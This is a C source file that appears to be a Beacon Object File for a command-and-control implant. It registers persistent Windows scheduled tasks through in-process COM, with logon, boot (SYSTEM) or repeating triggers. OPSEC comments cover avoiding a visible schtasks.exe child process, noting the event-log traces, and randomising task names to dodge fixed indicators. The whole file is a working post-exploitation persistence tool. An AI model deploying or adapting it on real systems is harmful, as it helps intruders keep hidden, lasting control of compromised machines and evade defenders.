/*
 * task_create.c — create a persisted scheduled task via COM ITaskService
 * RegisterTask (in-process, no schtasks.exe child).
 *
 * args: str taskName, str command, int mode
 *   mode 1 = LogonTrigger (default)   fires at user logon
 *   mode 2 = BootTrigger              fires at system boot (SYSTEM context, admin only)
 *   mode 3 = TimeTrigger + Repetition every N minutes for M hours (N, M from cmd tail)
 *
 * The task XML mirrors the standard Task Scheduler schema; a logon task set for
 * a group (S-1-5-32-544) requires admin — the wrapper reports the failure clearly.
 *
 * OPSEC:
 *   - No child process. Telemetry: Task Scheduler 106 (task registered) and
 *     200/201 on each launch; in-process COM avoids the plain visible
 *     "schtasks /create" LOB path but 106 is still written — plan the delete.
 *   - Cleanup: task-delete <name>; persist-inventory lists leftovers.
 */
#define CINTERFACE 1
#define COBJMACROS 1
#include <windows.h>
#include <taskschd.h>
#include "beacon.h"

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantClear(VARIANTARG*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, const char*, int, wchar_t*, int);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT int     __cdecl MSVCRTsprintf(char*, const char*, ...);

static const GUID kTaskCls  = { 0x0f87369f, 0xa4e5, 0x4cfc, { 0xbd,0x3e, 0x73,0xe6, 0x15,0x45, 0x72,0xdd } };
static const GUID kTaskIidS = { 0x2faba4c7, 0x4da9, 0x4013, { 0x96,0x97, 0x20,0xcc, 0x3f,0xd4, 0x0f,0x85 } };
static const GUID kTaskIidF = { 0x8cfac062, 0xa080, 0x4c15, { 0x9a,0x88, 0xaa,0x7c, 0x2a,0xf8, 0x0d,0xfc } };

/* neutral per-run suffix so task names are not fixed artifacts */
static void TaskNameSuffix(char* out)
{
    DWORD t = KERNEL32$GetTickCount();
    const char al[] = "abcdefghjkmnpqrstuvwxyz";
    MSVCRTsprintf(out, "%lu%c%c", (unsigned long)(t % 89999) + 10000,
                  al[(t >> 5) % 23], al[(t >> 11) % 23]);
}

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    char* nameA  = BeaconDataExtract(&p, NULL);
    char* cmdA   = BeaconDataExtract(&p, NULL);
    int   mode   = BeaconDataInt(&p);
    int   every  = BeaconDataInt(&p);   /* mode 3: minutes between runs */
    int   hours  = BeaconDataInt(&p);   /* mode 3: total window in hours */
    if (!nameA || !*nameA || !cmdA || !*cmdA) {
        BeaconPrintf(CALLBACK_ERROR, "usage: task-create <taskName> <command> [mode] [everyMin] [hours]\n");
        return;
    }
    if (!mode) mode = 1;
    if (mode == 3 && every < 1) every = 15;
    if (mode == 3 && hours < 1) hours = 24;

    char taskA[160], xmlA[1600];
    char suffix[16];
    TaskNameSuffix(suffix);
    MSVCRTsprintf(taskA, "%s.%s", nameA, suffix);

    if (mode == 2) {
        MSVCRTsprintf(xmlA,
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
            "<Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>"
            "<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>", cmdA);
    } else if (mode == 3) {
        MSVCRTsprintf(xmlA,
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
            "<Triggers><TimeTrigger><Repetition>"
            "<Interval>PT%dM</Interval><StopAtDurationEnd>true</StopAtDurationEnd>"
            "</Repetition>"
            "<ExecutionTimeLimit>PT%dH</ExecutionTimeLimit><Enabled>true</Enabled>"
            "</TimeTrigger></Triggers>"
            "<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>",
            every, hours, cmdA);
    } else {
        MSVCRTsprintf(xmlA,
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
            "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
            "<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>", cmdA);
    }

    wchar_t nameW[160], xmlW[1600];
    if (!KERNEL32$MultiByteToWideChar(CP_UTF8, 0, taskA, -1, nameW, 160) ||
        !KERNEL32$MultiByteToWideChar(CP_UTF8, 0, xmlA, -1, xmlW, 1600)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] wide conversion failed\n");
        return;
    }

    HRESULT hr;
    ITaskService* svc    = NULL;
    ITaskFolder*  folder = NULL;
    IRegisteredTask* task = NULL;

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx hr=0x%08lx\n", (unsigned long)hr);
        return;
    }
    hr = OLE32$CoCreateInstance(&kTaskCls, NULL, CLSCTX_INPROC_SERVER, &kTaskIidS, (void**)&svc);
    if (FAILED(hr) || !svc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance(TaskScheduler) hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }
    {
        VARIANT vEmpty;
        VariantInit(&vEmpty);
        hr = ITaskService_Connect(svc, vEmpty, vEmpty, vEmpty, vEmpty);
        VariantClear(&vEmpty);
    }
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Connect hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }
    hr = ITaskService_GetFolder(svc, L"\\", &folder);
    if (FAILED(hr) || !folder) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetFolder hr=0x%08lx\n", (unsigned long)hr);
        goto out;
    }
    {
        VARIANT vEmpty;
        VariantInit(&vEmpty);
        BSTR bName = OLEAUT32$SysAllocString(nameW);
        BSTR bXml  = OLEAUT32$SysAllocString(xmlW);
        /* TASK_CREATE_OR_UPDATE(6), TASK_LOGON_INTERACTIVE_TOKEN(3) */
        hr = ITaskFolder_RegisterTask(folder, bName, bXml, 6, vEmpty, vEmpty, 3, vEmpty, &task);
        OLEAUT32$SysFreeString(bXml);
        OLEAUT32$SysFreeString(bName);
        VariantClear(&vEmpty);
    }
    if (task) task->lpVtbl->Release(task);
    if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] task created: %s (mode=%d)\n[i] remove with: task-delete %s\n",
                     taskA, mode, taskA);
    } else if (hr == 0x80070520 || hr == 0x80070521) {
        BeaconPrintf(CALLBACK_ERROR, "[-] RegisterTask %s — logon type / privileges issue hr=0x%08lx (boot tasks need SYSTEM)\n", taskA, (unsigned long)hr);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] RegisterTask %s hr=0x%08lx\n", taskA, (unsigned long)hr);
    }

out:
    if (folder) folder->lpVtbl->Release(folder);
    if (svc)    svc->lpVtbl->Release(svc);
    OLE32$CoUninitialize();
}